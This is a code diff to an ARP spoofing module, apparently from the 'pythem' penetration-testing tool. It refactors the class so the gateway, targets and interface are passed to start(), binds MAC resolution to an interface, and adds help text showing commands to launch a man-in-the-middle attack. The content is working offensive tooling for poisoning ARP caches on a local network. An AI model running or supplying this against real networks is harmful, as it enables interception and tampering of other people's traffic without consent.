@@ -29,10 +29,16 @@ from utils import *
 class ARPspoof(object):
     name = "ARP poisoner spoofer"
     desc = "Use arp spoofing in order to realize a man-in-the-middle attack"
-    version = "0.5"
+    version = "0.6"
 
-    def __init__(self, gateway, targets, interface, myip, mymac):
+    def __init__(self):
+        self.gateway = None
+        self.targets = None
+        self.interface = None
+        self.myip = None
+        self.mymac = None
 
+    def start(self, gateway, targets, interface, myip, mymac):
         try:
             self.gateway = str(IPAddress(gateway))
         except AddrFormatError as e:
@@ -49,8 +55,6 @@ class ARPspoof(object):
         self.mymac = mymac
         self.socket = conf.L3socket(iface=self.interface)
         self.socket2 = conf.L2socket(iface=self.interface)
-
-    def start(self):
         t = threading.Thread(name='ARPspoof', target=self.spoof)
         t.setDaemon(True)
         t.start()
@@ -86,7 +90,7 @@ class ARPspoof(object):
     def resolve_mac(self, targetip):
         try:
             conf.verb = 0
-            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip), timeout=2)
+            ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op="who-has", pdst=targetip), timeout=2, iface=self.interface)
             for snd, rcv in ans:
                 return str(rcv[Ether].src)
         except socket.gaierror:
@@ -177,3 +181,17 @@ class ARPspoof(object):
             self.socket.close()
             self.socket2.close()
             return
+
+
+arpoisoner_help = """\n
+[Help] Start an ARP spoofing attack.
+parameters:
+ - start
+ - stop
+ - status
+ - help
+example:
+pythem> set interface eth0
+pythem> set gateway 192.168.0.1
+pythem> arpspoof start
+\n"""
